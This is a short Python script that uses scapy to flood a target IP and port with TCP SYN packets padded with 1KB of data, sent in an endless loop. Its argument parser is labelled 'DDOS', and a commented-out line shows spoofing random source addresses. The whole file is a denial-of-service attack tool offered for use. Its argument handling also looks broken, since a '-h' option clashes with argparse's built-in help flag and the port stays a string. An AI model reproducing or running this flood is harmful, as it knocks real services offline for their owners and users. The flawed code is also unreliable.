from scapy.all import *


def main(target_ip = "192.168.1.1", target_port = 80):

    # forge IP packet with target ip as the destination IP address
    ip = IP(dst=target_ip)
    # or if you want to perform IP Spoofing (will work as well)
    # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
    # forge a TCP SYN packet with a random source port
    # and the target port as the destination port
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    # add some flooding data (1KB in this case, don't increase it too much, 
    # otherwise, it won't work.)
    raw = Raw(b"X"*1024)
    # stack up the layers
    p = ip / tcp / raw
    # send the constructed packet in a loop until CTRL+C is detected 
    send(p, loop=1, verbose=0)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="DDOS")
    parser.add_argument("-h", "--host", action="store", help="Host to send packets to")
    parser.add_argument("-p", "--port", action="store", help="Port to send packets to")
    args = parser.parse_args()
    
    main(args.host, args.port)